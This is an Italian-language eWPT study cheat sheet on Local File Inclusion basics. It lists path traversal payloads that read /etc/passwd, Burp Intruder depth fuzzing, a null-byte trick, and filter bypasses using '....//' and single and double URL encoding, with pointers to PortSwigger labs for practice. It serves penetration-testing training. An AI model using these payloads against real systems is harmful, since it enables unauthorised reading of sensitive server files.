---
layout: cheatsheet
cert: ewpt
cert_label: "eWPT"
title: "LFI Basics"
permalink: "/cheatsheet/ewpt/03-file-inclusion/01-lfi-basics/"
section: "File Inclusion"
section_order: 3
order: 1
sort_key: 301
---

**Difficoltà:** Intermediate
**Time to Master:** 2h
**Prerequisiti:** [02-Scanning-Enumeration/03-Web-Enumeration.md](/cheatsheet/ewpt/02-scanning-enumeration/03-web-enumeration/)
**Lab:** PortSwigger Academy (Path Traversal)

---

## Obiettivo

Il primo parametro `?page=` o `?file=` che incontri sembra innocuo: carica un pezzo di pagina diverso in base al valore che gli passi. Ma se quel valore non è sanitizzato, stai dicendo al server di aprire un file qualsiasi sul filesystem, non solo quelli previsti da chi ha scritto l'app. Qui vedi come riconoscere questi parametri e leggere file arbitrari; è spesso solo il primo passo di una chain che finisce in RCE (vedi [04-Wrappers-PHP.md](/cheatsheet/ewpt/03-file-inclusion/04-wrappers-php/) e [LFI-Advanced.md](/cheatsheet/ewpt/03-file-inclusion/02-lfi-advanced/)), quindi capire bene questo meccanismo di base ti torna utile molto più avanti.

---

## Concetti chiave

### Dove cercare LFI

Qualsiasi parametro che sembra riferirsi a un file/path è candidato:
```
?page=about.php
?file=report.pdf
?template=header
?lang=en
?include=footer
```

### Path traversal

```
../  ->  sale di una directory
```
Ripetuto abbastanza volte ti porta alla radice del filesystem: da lì il resto è navigare verso file che sai essere lì, come `/etc/passwd`.

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| curl | `curl "URL?page=../../../etc/passwd"` | contenuto file | manuale, sempre parti da qui |
| Burp Intruder | payload list di traversal | risposte comparabili | utile per trovare profondità corretta |
| ffuf | fuzzing profondità traversal | risposte comparabili | automatizza il tentativo di più `../` |

---

## Payload / Esempi

### Esempio 1: path traversal classico

**Setup:**
- Target: applicazione PHP con `?page=`
- Vulnerability: LFI senza sanitizzazione

**Step-by-step:**
```bash
curl "http://target.com/index.php?page=../../../../../../etc/passwd"
curl "http://target.com/index.php?page=....//....//....//etc/passwd"
curl "http://target.com/index.php?page=/etc/passwd"
```

**Output atteso:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

**Spiegazione:** il numero di `../` deve superare la profondità della directory corrente; se non sai la profondita esatta, ripeti la sequenza molte volte (i `../` in eccesso oltre la root vengono ignorati dal filesystem).

### Esempio 2: trovare la profondità corretta con Burp Intruder

```
Payload position: ?page=§../§../../../etc/passwd
Payload list: 1,2,3,4,5,6,7,8,9,10 ripetizioni di "../"
```

**Spiegazione:** automatizzare il numero di traversal risparmia tempo rispetto a tentativi manuali uno a uno.

### Esempio 3: null byte (sistemi PHP < 5.3.4, raro oggi ma da conoscere)

```
?page=../../../etc/passwd%00
```

---

## Evasion / Bypass Techniques

### Bypass filtro che rimuove "../" una sola volta

```
....//....//....//etc/passwd
..././..././..././etc/passwd
```

### Encoding del traversal

```
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd   (double URL encoding)
```

### Bypass whitelist di estensione (append forzato)

Se l'app forza `.php` alla fine del path, usare i wrapper (vedi [04-Wrappers-PHP.md](/cheatsheet/ewpt/03-file-inclusion/04-wrappers-php/)) o un null byte su sistemi vecchi.

---

## Lab Hands-On

### Lab 1: PortSwigger Academy (File path traversal, simple case)
**Obiettivo:** leggere `/etc/passwd` tramite parametro vulnerabile
**Difficulty:** Facile
**Time:** 20 min

**Walkthrough breve:**
1. Identifica il parametro che carica file
2. Prova traversal diretto
3. Se filtrato, prova encoding/doppio encoding

---

## Common Mistakes

- Fermarsi al primo tentativo di `../../etc/passwd` senza variare la profondità -> prova sempre un range di ripetizioni
- Dimenticare l'encoding quando il traversal diretto viene filtrato -> molti WAF/filtri bloccano solo la stringa letterale `../`
- Non pensare ai file Windows (`..\..\windows\win.ini`) se il target è IIS/ASP

---

## Link Utili

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger Academy: Path Traversal](https://portswigger.net/web-security/file-path-traversal)

---

## Connessioni

- **Prerequisito:** [02-Scanning-Enumeration/03-Web-Enumeration.md](/cheatsheet/ewpt/02-scanning-enumeration/03-web-enumeration/)
- **Prossimo Step:** [02-LFI-Advanced.md](/cheatsheet/ewpt/03-file-inclusion/02-lfi-advanced/)
- **Combinazione con:** [04-Wrappers-PHP.md](/cheatsheet/ewpt/03-file-inclusion/04-wrappers-php/)

---

## Checklist di padronanza

- [ ] So identificare parametri candidati a LFI
- [ ] So costruire path traversal con profondità variabile
- [ ] Conosco almeno 3 tecniche di encoding per bypassare filtri base
- [ ] Ho letto con successo /etc/passwd su un lab
